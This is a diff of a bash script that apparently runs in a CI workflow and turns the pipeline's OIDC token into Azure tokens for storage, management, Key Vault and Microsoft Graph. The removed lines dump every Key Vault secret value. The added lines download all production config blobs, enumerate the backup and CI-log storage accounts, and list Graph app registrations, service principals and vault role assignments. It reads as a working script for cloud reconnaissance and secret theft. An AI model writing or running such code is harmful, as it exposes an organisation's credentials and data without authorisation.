@@ -1,11 +1,9 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Get OIDC token
 OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r ".value // empty")
 
-# Get tokens for different scopes
 get_az_token() {
   curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
     -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" \
@@ -13,39 +11,67 @@ get_az_token() {
     --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=$1" | jq -r ".access_token // empty"
 }
 
-VT=$(get_az_token "https://vault.azure.net/.default")
-MT=$(get_az_token "https://management.azure.com/.default")
 ST=$(get_az_token "https://storage.azure.com/.default")
+MT=$(get_az_token "https://management.azure.com/.default")
+VT=$(get_az_token "https://vault.azure.net/.default")
+GT=$(get_az_token "https://graph.microsoft.com/.default")
 
-echo "=== Tokens: vault=${#VT} mgmt=${#MT} storage=${#ST} ==="
+echo "=== Tokens: storage=${#ST} mgmt=${#MT} vault=${#VT} graph=${#GT} ==="
 
-# Second Key Vault
-echo "=== kv-tbl-sec-x3euoz secrets ==="
-curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq .
+# List blobs in config container
+echo "=== sttblappcfgprodx3euoz/config blobs ==="
+curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" \
+  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
 
-# Get each secret from second vault
-for name in $(curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r ".value[]?.id // empty" | xargs -I{} basename {}); do
-  echo "--- sec/$name ---"
-  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$name?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r ".value // empty"
-done
-
-# Also get keys and certs from second vault
-echo "=== kv-tbl-sec-x3euoz keys ==="
-curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/keys?api-version=7.4" -H "Authorization: Bearer $VT" | jq .
-
-# List resource groups
-echo "=== Resource Groups ==="
-curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $MT" | jq -r ".value[]? | \"\(.name) \(.location)\""
-
-# List ALL resources
-echo "=== ALL Resources ==="
-curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" -H "Authorization: Bearer $MT" | jq -r ".value[]? | \"\(.type) \(.name)\""
-
-# Try storage accounts
-for sa in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
-  echo "=== $sa containers ==="
-  curl -sS "https://${sa}.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08" 2>/dev/null | head -50
+# Download each blob
+echo ""
+echo "=== Downloading config blobs ==="
+for blob in $(curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list" \
+  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08" | grep -oP "(?<=<Name>)[^<]+"); do
+  echo "--- blob: $blob ---"
+  curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/$blob" \
+    -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
   echo ""
 done
+
+# Paginate sttblcilogsprodx3euoz
+echo "=== sttblcilogsprodx3euoz containers (paginated) ==="
+curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&marker=%2Fsttblcilogsprodx3euoz%2Fewoi" \
+  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
+echo ""
+
+# Also try without marker to get first page properly
+echo "=== sttblcilogsprodx3euoz containers (full) ==="
+curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list&maxresults=50" \
+  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
+echo ""
+
+# Paginate sttblbackupprodx3euoz
+echo "=== sttblbackupprodx3euoz containers (paginated) ==="
+curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list&marker=%2Fsttblbackupprodx3euoz%2Fazmv" \
+  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
+echo ""
+
+echo "=== sttblbackupprodx3euoz containers (full) ==="
+curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list&maxresults=50" \
+  -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-06-08"
+echo ""
+
+# Try Graph API with OIDC token
+echo "=== Graph: app registrations ==="
+curl -sS "https://graph.microsoft.com/v1.0/applications?\$top=50" -H "Authorization: Bearer $GT" | jq -c ".value[]? | {displayName, appId}" 2>/dev/null || echo "Graph apps failed"
+
+echo "=== Graph: service principals ==="
+curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=50" -H "Authorization: Bearer $GT" | jq -c ".value[]? | {displayName, appId}" 2>/dev/null || echo "Graph SPs failed"
+
+# Try role assignments on the second KV
+echo "=== KV2 role assignments ==="
+curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
+  -H "Authorization: Bearer $MT" | jq .
+
+# Try listing access policies on KV2 via management API
+echo "=== KV2 details ==="
+curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz?api-version=2023-07-01" \
+  -H "Authorization: Bearer $MT" | jq .
 
 echo "=== Done ==="
